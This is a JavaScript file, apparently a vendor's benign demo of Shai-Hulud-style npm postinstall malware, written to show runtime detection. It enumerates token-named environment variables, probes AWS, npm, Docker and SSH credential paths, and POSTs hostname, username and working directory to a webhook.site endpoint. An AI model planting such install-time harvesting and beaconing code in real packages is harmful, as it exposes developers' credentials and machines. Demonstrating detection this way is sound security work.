// SECURITY DEMO — benign simulation of Shai-Hulud / s1ngularity-class supply-chain TTPs.
// Purpose: demonstrate runtime behaviors that static analysis (DeepSec, SAST) cannot see,
// because this script is shipped inside a transitive npm dependency and runs at install time.
//
// This script performs NO destructive action. It:
//   1. Reads sensitive environment variables (token names only — values not transmitted)
//   2. Stat()s well-known credential files (no contents read or sent)
//   3. Beacons a single HTTPS request to a controlled webhook.site URL with a benign payload
// Garnet's eBPF sensor observes all of the above as syscalls and network flows — that's the point.

const fs = require("fs");
const https = require("https");
const os = require("os");
const path = require("path");

const BEACON_HOST = "webhook.site";
// Controlled webhook.site endpoint — captures the beacon to prove egress occurred.
const BEACON_PATH = "/12a51150-3375-430e-ad82-e65d449d9591";

// 1. Enumerate token-shaped env vars (TTP: Shai-Hulud token harvesting)
const tokenEnvKeys = Object.keys(process.env).filter(k =>
  /TOKEN|SECRET|KEY|PASSWORD|API/i.test(k)
);

// 2. Probe for well-known credential file paths (TTP: s1ngularity cred discovery)
const credPaths = [
  path.join(os.homedir(), ".aws", "credentials"),
  path.join(os.homedir(), ".npmrc"),
  path.join(os.homedir(), ".docker", "config.json"),
  path.join(os.homedir(), ".ssh", "id_rsa"),
  "/etc/passwd",
];
const presentCreds = credPaths.filter(p => {
  try { fs.statSync(p); return true; } catch { return false; }
});

// 3. Beacon out (TTP: C2 / exfil channel)
const payload = JSON.stringify({
  demo: "garnet-deepsec-blindspot",
  host: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  envKeysSeen: tokenEnvKeys.length,
  credFilesPresent: presentCreds.length,
  // NOTE: deliberately NOT sending values — this is a behavioral demo, not exfiltration.
});

console.log("[demo] simulating Shai-Hulud-class postinstall");
console.log("[demo] token-shaped env keys observed:", tokenEnvKeys.length);
console.log("[demo] credential paths present:", presentCreds);
console.log("[demo] beaconing to https://" + BEACON_HOST + BEACON_PATH);

// Synchronous-ish wait: keep the event loop alive until the request resolves.
const done = new Promise(resolve => {
  const req = https.request({
    host: BEACON_HOST,
    path: BEACON_PATH,
    method: "POST",
    headers: { "content-type": "application/json", "content-length": Buffer.byteLength(payload) },
    timeout: 8000,
  }, res => {
    let body = "";
    res.on("data", c => body += c);
    res.on("end", () => {
      console.log("[demo] beacon response:", res.statusCode, body.slice(0, 80));
      resolve();
    });
  });
  req.on("error", e => { console.log("[demo] beacon error:", e.message); resolve(); });
  req.on("timeout", () => { console.log("[demo] beacon timeout"); req.destroy(); resolve(); });
  req.write(payload);
  req.end();
});

done.then(() => console.log("[demo] done"));
